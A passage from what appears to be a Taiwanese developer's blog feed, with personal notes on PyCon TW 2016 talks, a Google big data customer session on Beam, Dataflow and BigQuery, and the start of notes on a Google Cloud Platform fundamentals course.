&lt;h2&gt;R1: 連淡水阿嬤都聽得懂的機器學習套件入門 scikit-learn by Cicilia (Chia-ying Lee)&lt;/h2&gt;
&lt;p&gt;Slides: &lt;a href="http://www.slideshare.net/aacs0130/scikitlearn-62706630"&gt;http://www.slideshare.net/aacs0130/scikitlearn-62706630&lt;/a&gt;  &lt;/p&gt;
&lt;h3&gt;對機器學習瞭解程度的分類&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Level 1: 不知道什麼是機器學習  &lt;/li&gt;
&lt;li&gt;Level 2: 知道機器學習是 AI 的子學門  &lt;/li&gt;
&lt;li&gt;Level 3: 會使用機器學習套件解問題  &lt;/li&gt;
&lt;li&gt;Level 4: 會選擇適合的機器學習演算法與調整參數  &lt;/li&gt;
&lt;li&gt;Level 5: 知道機器學習演算法的數學原理  &lt;/li&gt;
&lt;li&gt;Level 6: 會設計新的機器學習演算法  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;什麼是機器學習&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;我們有大量的樣本資料，讓機器自動從中學習出規則，用來預測其他未知的資料。  &lt;/li&gt;
&lt;li&gt;機器學習是基於機率、統計、逼近論等數學理論的研究。  &lt;/li&gt;
&lt;li&gt;機器學習可應用於電腦視覺、自然語言處理、語音和手寫識別與機器人等領域。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;機器學習的分類&lt;/h3&gt;
&lt;p&gt;分類的方法有很多種，以下為粗略的分類。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Supervised Learning  &lt;ul&gt;
&lt;li&gt;訓練集的目標是人為標註的。  &lt;/li&gt;
&lt;li&gt;分類(Classification)：預測類別  &lt;/li&gt;
&lt;li&gt;回歸(Regression)：預測變量  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unsupervised Learning  &lt;ul&gt;
&lt;li&gt;訓練集的目標沒有人為標註。  &lt;/li&gt;
&lt;li&gt;分群(Clustering)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;機器學習的流程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Training set =&amp;gt; Learning Algorithm =&amp;gt; Hypothesis / Model  &lt;/li&gt;
&lt;li&gt;再拿 Training set 透過 model 得到預測的 data  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Scikit-learn 數字辨識步驟&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Load Data  &lt;/li&gt;
&lt;li&gt;Set a classifier  &lt;/li&gt;
&lt;li&gt;Learn a model  &lt;/li&gt;
&lt;li&gt;predict the result  &lt;ul&gt;
&lt;li&gt;資料有一半當作 training set，有一半當作 testing set.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Evaluate  &lt;ul&gt;
&lt;li&gt;得到結果  &lt;/li&gt;
&lt;li&gt;會去算 precision, recall, f1-score  &lt;ul&gt;
&lt;li&gt;precision: 所有正確的例子裏面猜對了幾個  &lt;/li&gt;
&lt;li&gt;recall: 所有猜的例子裏面猜對了幾個  &lt;/li&gt;
&lt;li&gt;f1-score: 整合 precision 和 recall 的結果，得到總正確率  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Confusion Matrix  &lt;ul&gt;
&lt;li&gt;可以得知哪個類別比較容易被誤判成另外的某一個類別  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;前處理&lt;/h3&gt;
&lt;p&gt;大部分的機器學習演算法都是數學或統計模型有關的，&lt;br /&gt;
所以資料餵進去的時候必須要有維度，必須經過處理。  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Clean data  &lt;ul&gt;
&lt;li&gt;把不需要或多餘的資料(noise)去除  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Feature extraction  &lt;ul&gt;
&lt;li&gt;需要 domain knowledge 把用來判斷的關鍵抓出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Convert category and string to number  &lt;/li&gt;
&lt;li&gt;Sparse data  &lt;/li&gt;
&lt;li&gt;Feature selection  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;如何選擇該用哪個機器學習演算法&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://scikit-learn.org/stable/tutorial/machine_learning_map/"&gt;http://scikit-learn.org/stable/tutorial/machine_learning_map/&lt;/a&gt;  &lt;/p&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLXVfgk9fNX2I7tB6oIINGBmW50rrmFTqf"&gt;林軒田教授的機器學習教學影片&lt;/a&gt;  &lt;blockquote&gt;
&lt;p&gt;&lt;a href="http://blog.fukuball.com/tag/machine-learning/"&gt;http://blog.fukuball.com/tag/machine-learning/&lt;/a&gt; 有人寫了筆記可以參考  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: Deep Learning with Python &amp;amp; TensorFlow by Ian Lewis&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Neural Network can find a way to solve the problem.  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://playground.tensorflow.org"&gt;http://playground.tensorflow.org&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;基本上就是簡介 TensorFlow 及基本的 Machine Learning 概念  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 3 (2016/06/05 Sun)&lt;/h1&gt;
&lt;h2&gt;Lightning Talks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Swiftypy: Embedding Python in Swift  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/johnlinvc/swiftpy"&gt;https://github.com/johnlinvc/swiftpy&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;跟雪隧塞車說再見  &lt;ul&gt;
&lt;li&gt;結論：「避開各種假日就好了。」  &lt;/li&gt;
&lt;li&gt;半夜最不塞，半個小時就到了，你可以開到那邊再睡。XDD  &lt;/li&gt;
&lt;li&gt;你如果是今天看到新聞想說今天塞完了明天去，你就是最塞的那個。 XDDD  &lt;blockquote&gt;
&lt;p&gt;雖然跟 Python 沒什麼關係 XDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ProjectMeilin"&gt;徵音梅林計劃&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;中文版的初音！  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Play with Python importer  &lt;ul&gt;
&lt;li&gt;可以做到直接 import 進來就去 pip 上抓下來用  &lt;/li&gt;
&lt;li&gt;cffi  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PyCon TW 2016 Vendor Machine  &lt;/li&gt;
&lt;li&gt;用 Python 來分析德文性什麼  &lt;/li&gt;
&lt;li&gt;用 Python 玩 Docker  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/windperson/docker-crontab"&gt;https://github.com/windperson/docker-crontab&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rpi 在研討會上的應用  &lt;ul&gt;
&lt;li&gt;今年的新玩具：Pi 立得，用 Rpi 做相機，拍照完可以馬上列印出相片。  &lt;/li&gt;
&lt;li&gt;明年想做的玩具：講者評分系統  &lt;ul&gt;
&lt;li&gt;問卷回饋大家愛填不填  &lt;/li&gt;
&lt;li&gt;可以用 Camera 來看底下有多少人在睡覺來做評分 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我在業界學到的 Python Coding sytle  &lt;/li&gt;
&lt;li&gt;用 Python 寫視覺小說遊戲（亮亮的祭品）  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;今年原本預計要投稿結果還是沒投稿，&lt;br /&gt;
看明年有沒有機會吧？&lt;br /&gt;
其實應該不是沒東西可講，&lt;br /&gt;
只是單純覺得要到夠資格投稿講的程度還有一段差距。&lt;br /&gt;
而且好像該每天找些時間，&lt;br /&gt;
把近幾年世界各地的 PyCon 講了哪些 talks 都瞭解一下才是，&lt;br /&gt;
一直沒有花時間去好好瞭解其他地方的 PyCon 講了哪些議題。  &lt;/p&gt;
&lt;p&gt;今年和 Machine Learning 相關的 talk 明顯多了很多，&lt;br /&gt;
然後發現蠻多議程都有用到 Google Cloud Platform，&lt;br /&gt;
尤其很多人都拿 BigQuery 來用，&lt;br /&gt;
或許之後跟 GCP 更熟之後，&lt;br /&gt;
明年有機會可以來講場 Python 跟 GCP 有關的 talk 吧？&lt;br /&gt;
然後 Apua 講的那場 Roboframework 的 Q&amp;amp;A 也蠻熱烈的，&lt;br /&gt;
看來在 Agile 跟如何更快更方便的寫出夠完整的測試也還有蠻多關注的空間的。  &lt;/p&gt;
&lt;p&gt;第二天晚上因為弟弟電影的畢展，和爸媽一起去看，所以沒能參加 BoF。&lt;br /&gt;
第三天到了中午才到中研院，所以就只有參加到 Lightnig talks。&lt;br /&gt;
大概是因為用的是 eldarion 送的贊助票，所以互動販賣機的系統無法登入，也沒玩到互動販賣機。&lt;br /&gt;
大概也因為太久沒打 CTF 了，趨勢的五個題目也都沒解出來啊。&lt;br /&gt;
總之還有很多進步的空間。  &lt;/p&gt;
&lt;p&gt;在天瓏的攤位買了五本書，&lt;br /&gt;
希望可以如期看完，&lt;br /&gt;
今年要增加自己的閱讀量，&lt;br /&gt;
希望可以趕快看完啊。  &lt;/p&gt;
&lt;p&gt;當然還是要感謝辛苦的工作人員們，&lt;br /&gt;
感謝給了大家這麼好的一場年會。  &lt;/p&gt;</summary><category term="Python"></category><category term="Conf"></category><category term="PyCon"></category><category term="PyConTW"></category></entry><entry><title>Taiwan Customer Sharing Session - with Google Big Data Engineering team</title><link href="https://blog.m157q.tw/posts/2016/06/03/taiwan-customer-sharing-session-with-google-big-data-engineering-team/" rel="alternate"></link><published>2016-06-03T10:15:32+08:00</published><updated>2016-06-03T10:15:32+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-06-03:posts/2016/06/03/taiwan-customer-sharing-session-with-google-big-data-engineering-team/</id><summary type="html">&lt;h1&gt;Big Data at Google&lt;/h1&gt;
&lt;h2&gt;Speaker: Apurva Desai&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Apurva Desai has over 20 years of experience in building software and managing teams.  He has been with early stage startups to big sized companies.   He has been focused on cloud, big data and distributed computing for the last 10+years starting with Yahoo where his team was responsible to manage 20k+ nodes of Hadoop and provide solutions to internal projects migrating to Hadoop ecosystem.  At Pivotal Software, a spinoff of EMC, his team built and commercialized Pivotal’s Hadoop distribution.  Most recently he managed Motorola’s mobile phone experiences powered by mobile cloud backend running on GCP.  Apurva earned his Bachelor’s of engineering from University of Mumbai, India and Master of engineering from Simon Fraser University, Canada  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://research.google.com/pubs/pub41378.html"&gt;MillWheel&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://flume.apache.org/"&gt;Flume&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;What does Cloud 3.0 look like?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Cloud 2.0 (Assembly Required)  &lt;ul&gt;
&lt;li&gt;VMs  &lt;/li&gt;
&lt;li&gt;Object Store  &lt;/li&gt;
&lt;li&gt;Databases  &lt;/li&gt;
&lt;li&gt;Networking  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;Containers  &lt;/li&gt;
&lt;li&gt;Messaging  &lt;/li&gt;
&lt;li&gt;NoSQL  &lt;/li&gt;
&lt;li&gt;Big Data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Complixities of Big Data Processing&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Programming  &lt;/li&gt;
&lt;li&gt;Resource provisioning  &lt;/li&gt;
&lt;li&gt;Handling growing scale  &lt;/li&gt;
&lt;li&gt;Reliability  &lt;/li&gt;
&lt;li&gt;Deployment &amp;amp; Configuration  &lt;/li&gt;
&lt;li&gt;Utilization improvements  &lt;/li&gt;
&lt;li&gt;Performance tuning  &lt;/li&gt;
&lt;li&gt;Monitoring  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;But what you should do is focusing on programming and dig your data.  &lt;/p&gt;
&lt;h2&gt;10+ Years of Tackling Big Data Problems&lt;/h2&gt;
&lt;p&gt;&lt;img alt="10+ Years of Tackling Big Data Problem" src="/files/taiwan-customer-sharing-session-with-google-big-data-engineering-team/google-big-data-history.jpg" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Google_File_System"&gt;GFS&lt;/a&gt; (2002 ~ 2004)  &lt;/li&gt;
&lt;li&gt;MapReduce (2004 ~ 2005)  &lt;ul&gt;
&lt;li&gt;Dataflow (GCP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BigTable (2005 ~ 2006)  &lt;ul&gt;
&lt;li&gt;Apache HBase  &lt;/li&gt;
&lt;li&gt;Hadoop  &lt;/li&gt;
&lt;li&gt;Bigtable (GCP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dremel (2006 ~ 2008)  &lt;ul&gt;
&lt;li&gt;Apache Drill  &lt;/li&gt;
&lt;li&gt;BigQuery (GCP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PubSub (2008 ~ 2010)  &lt;ul&gt;
&lt;li&gt;Pub/Sub (GCP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;FlumeJava (2010 ~ 2012)  &lt;ul&gt;
&lt;li&gt;Apache Crunch  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MillWheel (2012 ~ 2014)  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://beam.apache.org"&gt;Apache Beam&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Dataflow (GCP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TensorFlow (2014 ~ now)  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;"Google is living a few years in the future and sending the rest of us messages." - Doug Cutting, Hadoop Co-Creator  &lt;/p&gt;
&lt;h2&gt;Bridging the Waves&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Bridging the Waves" src="/files/taiwan-customer-sharing-session-with-google-big-data-engineering-team/bridging-the-waves.jpg" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Capture  &lt;ul&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;Pub/Sub  &lt;/li&gt;
&lt;li&gt;Logs, App Engine  &lt;/li&gt;
&lt;li&gt;BigQuery streaming  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 2.0  &lt;ul&gt;
&lt;li&gt;Rabbit MQ  &lt;/li&gt;
&lt;li&gt;Kafka  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Store  &lt;ul&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;Cloud Storage (objects)  &lt;/li&gt;
&lt;li&gt;BigQuery Storage (structured)  &lt;/li&gt;
&lt;li&gt;Cloud Bigtable (NoSQL HBase)  &lt;/li&gt;
&lt;li&gt;Cloud Datastore (NoSQL)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 2.0  &lt;ul&gt;
&lt;li&gt;Cassandra  &lt;/li&gt;
&lt;li&gt;HBase  &lt;/li&gt;
&lt;li&gt;MongoDB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Process  &lt;ul&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;Cloud Dataflow (stream and batch)  &lt;/li&gt;
&lt;li&gt;Cloud Dataproc  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 2.0  &lt;ul&gt;
&lt;li&gt;Hadoop &amp;amp; Ecosystem  &lt;ul&gt;
&lt;li&gt;Spark  &lt;/li&gt;
&lt;li&gt;Hive  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Analyze  &lt;ul&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;BigQuery (large scale SQL)  &lt;/li&gt;
&lt;li&gt;Cloud Machine Learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 2.0  &lt;ul&gt;
&lt;li&gt;Hadoop &amp;amp; Ecosystem  &lt;ul&gt;
&lt;li&gt;Spark  &lt;/li&gt;
&lt;li&gt;Hive  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Visualize  &lt;ul&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;Cloud DataLab (Python/Jupyter Notebook)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 2.0  &lt;ul&gt;
&lt;li&gt;Tableau  &lt;/li&gt;
&lt;li&gt;Qlik  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Reference Architecture&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Reference Architecture" src="/files/taiwan-customer-sharing-session-with-google-big-data-engineering-team/reference-architecture.jpg" /&gt;  &lt;/p&gt;
&lt;h2&gt;Apache Beam and Google Cloud Dataflow&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Dataflow  &lt;ul&gt;
&lt;li&gt;API Interface (SDK)  &lt;ul&gt;
&lt;li&gt;Dataflow model / Beam model  &lt;/li&gt;
&lt;li&gt;You can write you own sdk with any language  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Apache Beam  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Beam vs Spark&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Classic Batch Processing  &lt;ul&gt;
&lt;li&gt;Simillar  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Windowing  &lt;ul&gt;
&lt;li&gt;Beam  &lt;ul&gt;
&lt;li&gt;Window  &lt;/li&gt;
&lt;li&gt;Sum  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Spark  &lt;ul&gt;
&lt;li&gt;Window &amp;amp; Sum  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Late Data  &lt;ul&gt;
&lt;li&gt;Beam is more easy to implement in this part  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sessions  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Dataflow&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Fully-managed and auto-configured  &lt;/li&gt;
&lt;li&gt;Auto graph-optimized for best execution path  &lt;/li&gt;
&lt;li&gt;Autoscaling mid-job  &lt;/li&gt;
&lt;li&gt;Dynamic Work Rebalancing mid-job  &lt;/li&gt;
&lt;li&gt;Fault Tolerant execution of Beam pipelines  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Dataproc - Managed Hadoop + Spark&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Start a massive Hadoop or Spark cluster in 90 seconds  &lt;/li&gt;
&lt;li&gt;Pre emptible VMs at 30% of othe cost, Custom VMs  &lt;/li&gt;
&lt;li&gt;Per-minute billing  &lt;/li&gt;
&lt;li&gt;Separation of Storage + Compute  &lt;/li&gt;
&lt;li&gt;Incredibly fast networking  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Ephemeral clusters - jobs before clusters&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Deploy Cluster  &lt;/li&gt;
&lt;li&gt;Submits jobs  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Separation of Storage and Compute&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Based on your use cases  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;BigQuery&lt;/h2&gt;
&lt;h3&gt;Fun BigQuery Stats&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Largest query by rows =&amp;gt; 10.5 Trillion rows  &lt;/li&gt;
&lt;li&gt;Larget query by data size =&amp;gt; 2.1 PB  &lt;/li&gt;
&lt;li&gt;Largest storage customer =&amp;gt; 62 PB  &lt;/li&gt;
&lt;li&gt;Streaming per second =&amp;gt; 4.5 million  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;BigQuery - explained&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;We just rented ~9000 cores from Google for ~30 seconds  &lt;/li&gt;
&lt;li&gt;We only paid $20  &lt;/li&gt;
&lt;li&gt;Most importantly, it's hide from end users.  &lt;/li&gt;
&lt;li&gt;Users do not thins about cores.  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;What is BigQuery?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Serveless, Fully Managed, No-Ops Data Warehouse  &lt;/li&gt;
&lt;li&gt;Petabyte-Scale and Fast  &lt;/li&gt;
&lt;li&gt;Convenience of SQL  &lt;/li&gt;
&lt;li&gt;Externalization of Google Dremel  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Cloud Pub/Sub - Asynchronous Messaging&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;A FULLY-MANAGED GLOBAL Publish and Subscribe service (a many-to-many queue)  &lt;/li&gt;
&lt;li&gt;Seamlessly scales to 1,000,000+ QPS  &lt;/li&gt;
&lt;li&gt;Guaranteed durable at-least-once delivery  &lt;/li&gt;
&lt;li&gt;7-day message acknowledgement window  &lt;/li&gt;
&lt;li&gt;Simple REST API makes it portable  &lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.oreilly.com/ideas/the-world-beyond-batch-streaming-102"&gt;The world beyond batch: Streaming 102 - O'Reilly Media&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Case study: Spotify's Event Delivery System&lt;/h1&gt;
&lt;h2&gt;Speaker: Jelena Pješivac-Grbović&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Dr. Jelena Pješivac-Grbović is a staff software engineer in Cloud at Google, in Mountain View, CA. She is the lead for MapReduce and one of the leads of the Google Cloud Dataflow project.  Jelena's research interests include large-scale data processing, distributed, and cloud computing. She is an active member of IEEE, ACM, and SWE.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;其實就是把 References 那三篇稍微帶過這樣。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Event Delivery System  &lt;ul&gt;
&lt;li&gt;High QPS  &lt;ul&gt;
&lt;li&gt;~700K events/sec in peak  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://labs.spotify.com/2016/02/25/spotifys-event-delivery-the-road-to-the-cloud-part-i/"&gt;Spotify’s Event Delivery – The Road to the Cloud (Part I) | Labs&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://labs.spotify.com/2016/03/03/spotifys-event-delivery-the-road-to-the-cloud-part-ii/"&gt;Spotify’s Event Delivery – The Road to the Cloud (Part II) | Labs&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://labs.spotify.com/2016/03/10/spotifys-event-delivery-the-road-to-the-cloud-part-iii/"&gt;Spotify’s Event Delivery – The Road to the Cloud (Part III) | Labs&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;附上一張到此一遊照 (?)  &lt;/p&gt;
&lt;p&gt;&lt;img alt="GCP VIP Customer Workshop" src="/files/taiwan-customer-sharing-session-with-google-big-data-engineering-team/gcp-vip-customer-workshop.jpg" /&gt;  &lt;/p&gt;</summary><category term="Google Cloud Platform"></category></entry><entry><title>CP100A: Google Cloud Platform Fundamentals</title><link href="https://blog.m157q.tw/posts/2016/05/25/cp100a-google-cloud-platform-fundamentals/" rel="alternate"></link><published>2016-05-25T22:47:00+08:00</published><updated>2016-05-25T22:47:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-05-25:posts/2016/05/25/cp100a-google-cloud-platform-fundamentals/</id><summary type="html">&lt;h1&gt;課程資訊&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://myclass.gcptrain.org/"&gt;http://myclass.gcptrain.org/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;OXZnOGVkCg==  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/"&gt;https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/cp100-v2"&gt;https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/cp100-v2&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWIaXNqWnNDT0VmaG8/view?usp=sharing"&gt;slides.tar.gz&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Course Overview&lt;/h1&gt;
&lt;p&gt;&lt;img alt="CP100 V2: Google Cloud Platform Fundamentals" src="/files/cp100a-google-cloud-platform-fundamentals/course-overview.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 1: Introducing Google Cloud Platform&lt;/h1&gt;
&lt;h2&gt;Why Choose Google Cloud Platform?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;你可以在 GCP 看到所有不同 Region 的機器，不用像 AWS 一樣必須切換 Region  &lt;/li&gt;
&lt;li&gt;可以直接享用 Google 遍布全球的網路設施  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Google's Infrastructure&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloudplatformonline.com/next2016-schedule.html"&gt;GCP Next&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GCP 的年度會議  &lt;blockquote&gt;
&lt;p&gt;目前似乎辦了兩屆。&lt;br /&gt;
2015 年第一屆辦在日本東京&lt;br /&gt;
2016 年第二屆辦在荷蘭阿姆斯特丹。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最近在日本新增了 Data Center  &lt;/li&gt;
&lt;li&gt;Google 的高速 Backbone Network  &lt;/li&gt;
&lt;li&gt;Points of Presence  &lt;ul&gt;
&lt;li&gt;幾乎全球都有節點  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Edge Caching  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Cloud Regions and Zones&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Central US  &lt;/li&gt;
&lt;li&gt;Eastern US  &lt;/li&gt;
&lt;li&gt;East Asia  &lt;ul&gt;
&lt;li&gt;Data Center 在彰化  &lt;/li&gt;
&lt;li&gt;和 CloudFlare 有合作，最近 CloudFlare 和中華電信合作，在台北有機房。  &lt;/li&gt;
&lt;li&gt;所以在臺灣的 latency 蠻低的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Western Europe  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/compute/docs/regions-zones/regions-zones"&gt;https://cloud.google.com/compute/docs/regions-zones/regions-zones&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Innovative, Customer-Friendly Pricing&lt;/h2&gt;
&lt;ul&gt;
